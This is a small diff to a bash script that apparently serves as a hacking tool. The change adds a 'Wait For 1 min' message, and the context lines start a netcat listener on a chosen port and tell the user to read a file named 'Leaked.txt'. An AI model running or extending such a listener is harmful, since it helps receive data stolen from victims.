@@ -26,6 +26,7 @@ then
 read -p $'\e\n[1;93mEnter The Port: \e[0m' port
 echo""
 printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
+printf "\n\e[1;93mWait For 1 min And Type The Command Below\e[0m"
 printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
 nc -klvp $port
 sleep 1
@@ -57,6 +58,7 @@ read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
 	if [[ $Option == Y || $Option == y ]]
 	then
 	printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
+	printf "\n\e[1;93mWait For 1 min And Type The Command Below\e[0m"
 	printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
 	nc -klvp $port
 	sleep 1
